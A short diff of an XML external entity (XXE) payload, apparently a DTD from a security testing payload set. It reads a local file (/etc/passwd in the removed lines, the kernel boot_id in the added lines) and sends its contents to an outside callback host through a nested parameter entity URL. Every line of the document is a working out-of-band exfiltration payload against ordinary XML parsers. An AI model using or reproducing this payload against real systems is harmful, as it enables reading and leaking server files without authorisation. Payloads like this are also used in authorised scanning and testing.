@@ -1,4 +1,4 @@
-<!ENTITY % f SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://kaid.callback.red/i017-exfil-passwd?d=%f;'>">
+<!ENTITY % f SYSTEM "file:///proc/sys/kernel/random/boot_id">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://kaid.callback.red/i017-exfil-bootid?d=%f;'>">
 %eval;
 %exfil;
